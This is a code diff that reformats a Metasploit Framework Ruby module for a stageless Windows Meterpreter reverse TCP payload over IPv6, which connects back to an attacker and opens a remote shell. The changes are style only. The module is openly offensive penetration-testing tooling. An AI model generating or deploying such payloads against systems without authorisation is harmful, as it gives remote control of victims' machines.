@@ -3,9 +3,7 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 module MetasploitModule
-
   CachedSize = 177734
 
   include Msf::Payload::TransportConfig
@@ -15,43 +13,45 @@ module MetasploitModule
   include Msf::Sessions::MeterpreterOptions
 
   def initialize(info = {})
-
-    super(merge_info(info,
-      'Name'        => 'Windows Meterpreter Shell, Reverse TCP Inline (IPv6)',
-      'Description' => 'Connect back to attacker and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.',
-      'Author'      => [ 'OJ Reeves' ],
-      'License'     => MSF_LICENSE,
-      'Platform'    => 'win',
-      'Arch'        => ARCH_X86,
-      'Handler'     => Msf::Handler::ReverseTcp,
-      'Session'     => Msf::Sessions::Meterpreter_x86_Win
-      ))
+    super(
+      merge_info(
+        info,
+        'Name' => 'Windows Meterpreter Shell, Reverse TCP Inline (IPv6)',
+        'Description' => 'Connect back to attacker and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.',
+        'Author' => [ 'OJ Reeves' ],
+        'License' => MSF_LICENSE,
+        'Platform' => 'win',
+        'Arch' => ARCH_X86,
+        'Handler' => Msf::Handler::ReverseTcp,
+        'Session' => Msf::Sessions::Meterpreter_x86_Win
+      )
+    )
 
     register_options([
       OptString.new('EXTENSIONS', [false, 'Comma-separate list of extensions to load']),
-      OptString.new('EXTINIT',    [false, 'Initialization strings for extensions']),
-      OptInt.new("SCOPEID", [false, "The IPv6 Scope ID, required for link-layer addresses", 0])
+      OptString.new('EXTINIT', [false, 'Initialization strings for extensions']),
+      OptInt.new('SCOPEID', [false, 'The IPv6 Scope ID, required for link-layer addresses', 0])
     ])
   end
 
-  def generate(opts={})
+  def generate(opts = {})
     opts[:stageless] = true
     stage_meterpreter(opts) + generate_config(opts)
   end
 
-  def generate_config(opts={})
+  def generate_config(opts = {})
     opts[:uuid] ||= generate_payload_uuid
 
     # create the configuration block
     config_opts = {
-      arch:       opts[:uuid].arch,
-      exitfunk:   datastore['EXITFUNC'],
+      arch: opts[:uuid].arch,
+      exitfunk: datastore['EXITFUNC'],
       expiration: datastore['SessionExpirationTimeout'].to_i,
-      uuid:       opts[:uuid],
+      uuid: opts[:uuid],
       transports: [transport_config_reverse_ipv6_tcp(opts)],
       extensions: (datastore['EXTENSIONS'] || '').split(','),
-      ext_init:   (datastore['EXTINIT'] || ''),
-      stageless:  true,
+      ext_init: datastore['EXTINIT'] || '',
+      stageless: true
     }.merge(meterpreter_logging_config(opts))
 
     # create the configuration instance based off the parameters
@@ -61,4 +61,3 @@ module MetasploitModule
     config.to_b
   end
 end
-
